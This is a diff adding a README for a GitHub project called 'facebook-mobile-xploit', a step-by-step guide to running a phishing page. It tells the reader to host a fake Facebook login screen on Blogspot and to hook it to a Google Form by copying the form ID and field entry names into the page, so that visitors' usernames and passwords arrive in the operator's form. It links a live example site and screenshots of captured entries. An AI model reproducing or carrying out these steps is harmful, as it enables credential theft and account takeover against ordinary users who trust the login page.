@@ -1,1 +1,32 @@
-# facebook-mobile-xploit
+the source code of the website with a fake facebook login screen is here: https://github.com/MTHS1901/facebook-mobile-xploit/blob/master/index.html
+
+you can create it on a blogspot or hosted html page.
+
+# where do you get passwords in the google form.
+
+### 1. create a form with two options for entering text, as shown in the image below.
+  <img src = "https://raw.githubusercontent.com/MTHS1901/facebook-mobile-xploit/master/1.png" width = "350">
+  
+### 2. click to view the form and obtain the form ID.
+<img src = "https://raw.githubusercontent.com/MTHS1901/facebook-mobile-xploit/master/2.png" width = "350">
+replace the url ID on the line below
+https://github.com/MTHS1901/facebook-mobile-xploit/blob/ac7972d1dd7fe1e6899d6ca3828bf294d609f987/index.html#L99
+
+### 3. press f12 and get both "entry.XXXXXXX" from your form.
+<img src = "https://raw.githubusercontent.com/MTHS1901/facebook-mobile-xploit/master/3.png" width = "350">
+replace the entry in the lines below
+username entry https://github.com/MTHS1901/facebook-mobile-xploit/blob/ac7972d1dd7fe1e6899d6ca3828bf294d609f987/index.html#L100
+and
+password entry https://github.com/MTHS1901/facebook-mobile-xploit/blob/ac7972d1dd7fe1e6899d6ca3828bf294d609f987/index.html#L102
+
+### DONE!
+
+###xploit example on blospot: https://pt-facebook.blogspot.com (please don't submit your username and password.)
+
+#### Entered
+  <img src = "https://raw.githubusercontent.com/MTHS1901/facebook-mobile-xploit/master/4.png" width = "350">
+  
+ #### Received
+  <img src = "https://raw.githubusercontent.com/MTHS1901/facebook-mobile-xploit/master/5.png" width = "350">
+  
+  #### after that save your HTML and test your tool, randomly insert something in the username and password fields and you will receive it in your form, if you have any questions contact me.
